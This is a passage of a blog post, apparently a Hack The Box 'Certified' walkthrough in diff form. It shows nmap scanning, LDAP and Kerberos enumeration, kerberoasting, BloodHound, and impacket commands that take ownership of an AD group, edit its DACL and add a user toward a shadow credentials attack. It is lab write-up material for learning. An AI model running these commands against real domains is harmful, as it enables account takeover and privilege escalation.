ert:%20Subject:%20commonName=DC01.certified.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.certified.htb%0a%7c%20Not%20valid%20before:%202024-05-13T15:49:36%0a%7c_Not%20valid%20after:%20%202025-05-13T15:49:36%0a%7c_ssl-date:%202024-11-06T15:10:01&#43;00:00;%200s%20from%20scanner%20time.%0a3269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20certified.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202024-11-06T15:10:01&#43;00:00;%200s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.certified.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.certified.htb%0a%7c%20Not%20valid%20before:%202024-05-13T15:49:36%0a%7c_Not%20valid%20after:%20%202025-05-13T15:49:36%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a49265/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49666/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49677/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49678/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49681/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49708/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49729/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2888%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2888%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20DC01;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-11-06T15:09:26%0a%7c_%20%20start_date:%20N/A%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20206.50%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Certified/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 15:06:16 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-06 15:06 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> certified.htb <span style="color:#f92672">(</span>10.129.107.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-06 15:08:29Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: certified.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-06T15:10:01+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-05-13T15:49:36
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-05-13T15:49:36
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49265/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49681/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49708/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49729/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-11-06T15:09:26
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 206.50 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
+<ul>
+<li>
+<p>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.</p>
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapire">https://github.com/bloodstiller/ldapire</a></li>
+<li><a href="https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb">https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb</a>
+<ul>
+<li><code>python3 ldapchecker.py $box</code>
+<ul>
+<li>It will dump general information &amp; also detailed &amp; simple information including:
+<ul>
+<li>Groups</li>
+<li>Users</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  ldapServiceName:
+</span></span><span style="display:flex;"><span>    certified.htb:dc01$@CERTIFIED.HTB</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Functional Level Number</th>
+          <th>Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>Windows 2000</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>+Note+:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.)</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC01,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>certified,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+</ul>
+<h4 id="updating-etc-hosts-and-variables">Updating ETC/HOSTS &amp; Variables:</h4>
+<ul>
+<li>
+<p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
+<ul>
+<li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
+<ul>
+<li><code>update_var domain &quot;certified.htb&quot;</code></li>
+<li><code>update_var machine &quot;DC01&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updating <code>/etc/hosts</code> for DNS and LDAP Queries</strong>:</p>
+<ul>
+<li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration and other tools that require DNS or LDAP for queries:
+<ul>
+<li><code>echo &quot;$box   $domain $machine.$domain&quot; | sudo tee -a /etc/hosts</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="syncing-clocks-for-kerberos-exploitation">Syncing Clocks for Kerberos Exploitation:</h4>
+<ul>
+<li>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
+<ul>
+<li><code>sudo ntpdate -s $domain</code></li>
+<li>+Note+: I am doing this now as we have the DNS name etc.</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li><strong>Using dnsenum to enumerate DNS entries</strong>:
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-081804_.png">
+</figure>
+</li>
+<li>Nothing of note.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
+<ul>
+<li><strong>As kerberos is present we can enumerate users using</strong> <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
+<ul>
+<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-081744_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="using-netexec-for-asreproasting">Using netexec for ASReproasting:</h4>
+<ul>
+<li>
+<p><strong>We should always try and asreproast with a null/guest session as it can lead to an easy win</strong>:</p>
+<ul>
+<li><code>netexec ldap $box -u '' -p '' --asreproast asrep.txt</code>
+<ul>
+<li>This fails as NULL sessions are disabled.</li>
+</ul>
+</li>
+<li><code>netexec ldap $box -u guest -p '' --asreproast asrep.txt</code>
+<ul>
+<li>This lets me know that the guest account is disabled.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-080809_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We also have creds though so lets try with those</strong>:</p>
+<ul>
+<li><code>netexec ldap $box -u $user -p $pass --asreproast asrep.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-080934_.png">
+</figure>
+</li>
+<li>No dice.</li>
+</ul>
+</li>
+</ul>
+<h4 id="kerberoasting-to-retrieve-the-management-svc-hash">Kerberoasting to retrieve the management_svc hash:</h4>
+<ul>
+<li><strong>As we have creds we can also kerberoast using netexec</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-081951_.png">
+</figure>
+</li>
+<li>We get one for <code>management_svc</code>:</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-crack-management-svc-hash">Trying to crack management_svc hash:</h4>
+<ul>
+<li><strong>I run the hash through hashcat using rockyou but it does not crack</strong>:
+<ul>
+<li><code>hashcat -m 13100 kerb.out /home/kali/Wordlists/rockyou.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-082414_.png">
+</figure>
+</li>
+<li>We can put this in our back-pocket for later.</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="enumerating-as-judith">Enumerating as Judith:</h3>
+<ul>
+<li>A lot these steps will seem jumbled when looking at time stamps, just know I was jumping between different windows etc when doing things.</li>
+</ul>
+<h4 id="connecting-as-judith-to-smb">Connecting as Judith to SMB:</h4>
+<ul>
+<li><strong>Lets connect to SMB and see what we can find</strong>:
+<ul>
+<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-081032_.png">
+</figure>
+</li>
+<li>She has access to 3 shares, the interesting one is SYSVOL as these often have scripts.</li>
+</ul>
+</li>
+</ul>
+<h5 id="using-smbclient">Using smbclient:</h5>
+<ul>
+<li>
+<p><strong>I check SYSVOL but there is nothing of note</strong>:</p>
+<ul>
+<li><code>smbclient -U $user &quot;\\\\$box\\SYSVOL&quot;</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I check NETLOGOn but there is nothing of note</strong>:</p>
+<ul>
+<li><code>smbclient -U $user &quot;\\\\$box\\NETLOGON&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="attempting-to-connect-via-evil-winrm">Attempting to connect via evil-winrm:</h4>
+<ul>
+<li><strong>I attempt to connect via evil-winrm but we cannot</strong>:
+<ul>
+<li><code>evil-winrm -i $box -u $user -p $pass</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-081341_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
+<ul>
+<li><strong>I try and gather more information via</strong> <code>impacket-lookupsid</code>:
+<ul>
+<li><code>impacket-lookupsid $domain/$user@$machine.$domain -domain-sids</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-083147_.png">
+</figure>
+</li>
+<li>We can see we have more users here which is interesting so I will add them to my list of users, what is especially interesting is the Alias <code>Cert Publishers</code> as this indicates AD-CS is running (although it was not present in the scans so far). Lets continue to enumerate.</li>
+</ul>
+</li>
+</ul>
+<h4 id="bloodhound-collection">Bloodhound collection:</h4>
+<h5 id="attempted-bloodhound-collection-using-netexec">Attempted Bloodhound collection using netexec:</h5>
+<ul>
+<li><strong>I try and run a bloodhound collection using netexec but it does not work (in fact it never works for me…)</strong>:
+<ul>
+<li><code>netexec ldap $machine.$domain -u $user -p $pass --bloodhound --collection All</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-081437_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="bloodhound-collection-via-bloodhound-python">Bloodhound collection via bloodhound-python:</h5>
+<ul>
+<li><strong>I run bloodhound-pythong to get a collection, which works</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-081555_.png">
+</figure>
+</li>
+<li>It works.</li>
+<li>I ingest this into bloodhound.</li>
+</ul>
+</li>
+</ul>
+<h4 id="running-certipy-ad-to-enumerate-vulnerable-certificates">Running certipy-ad to enumerate vulnerable certificates:</h4>
+<ul>
+<li>
+<p>Whilst bloodhound ingests our data lets enumerate the CA. There has been nothing obvious other than the alias <code>Cert Publishers</code> to indicate it&rsquo;s running &amp; the fact the box is called &ldquo;Certified&rdquo;.</p>
+</li>
+<li>
+<p><strong>I run certipy-ad to enumerate the CA</strong>:</p>
+<ul>
+<li><code>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-084403_.png">
+</figure>
+</li>
+<li>No templates found under this current user.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-085309_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="discovering-our-user-has-genericwrite-privs-over-management-svc">Discovering our user has GenericWrite privs over MANAGEMENT_SVC:</h3>
+<ul>
+<li>Looking at our bloodhound results we can see that our user &ldquo;Judith&rdquo; has <code>WriteOwner</code> privs over the group &ldquo;Management&rdquo; who
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-085720_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-11-06-090609_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>The &ldquo;Management&rdquo; group in-turn has <code>GenericWrite</code> over the account &ldquo;MANAGEMENT_SVC&rdquo; whos&rsquo;s kerberos ticket we extracted earlier.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-085803_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-11-06-090632_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="planning-our-attack-path">Planning our attack path:</h3>
+<ol>
+<li>First we will make ourselves owner of the group &ldquo;Management&rdquo;:
+<ul>
+<li>As we have <code>WriteOwner</code> privileges over the group &ldquo;Management&rdquo; we can make ourselves the owner of the group:</li>
+</ul>
+</li>
+<li>Second we will modify the rights to allow ourselves to add user
+<ul>
+<li>Once we are owner we will then need to modify our rights to be able to add users to the group.</li>
+</ul>
+</li>
+<li>Third we will add ourselves to the group &ldquo;Management&rdquo;:</li>
+<li>Fourth we will perform shadow credentials attack on &ldquo;MANAGEMENT_SVC&rdquo;:
+<ul>
+<li>We can then perform a shadow credentials attack to add certificate based credentials to the user &ldquo;MANAGEMENT_SVC&rdquo; and then authenticate as them and request a kerberos ticket which we can then pass to be used as authentication. We can do this as we will now be part of the &ldquo;Management&rdquo; group and in turn have <code>GenericWrite</code> over the &ldquo;MANAGEMENT_SVC&rdquo; object.</li>
+<li>+Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector:
+<ul>
+<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="making-judith-owner-of-the-management-group-and-then-adding-her-as-a-user">Making Judith owner of the Management group &amp; then adding her as a user:</h3>
+<p>+Note+: For some reason impacket is displaying lots of errors but we can ignore them as it&rsquo;s still completing the tasks. I&rsquo;ve included them here in-case you also get them.</p>
+<ol>
+<li>
+<p><strong>Make judith the new owner of management</strong>:</p>
+<ul>
+<li><code>impacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-091341_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Grant Judith the ability to add users to the group by modifying the DACL&rsquo;s</strong>:</p>
+<ul>
+<li><code>impacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid  'S-1-5-21-729746778-2675978091-3820388244-1104' $domain/$user:$pass</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-091928_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Add judith to the group</strong>:</p>
+<ul>
+<li><code>net rpc group addmem &quot;Management&quot; $user -U $domain/$user%$pass -S $box</code></li>
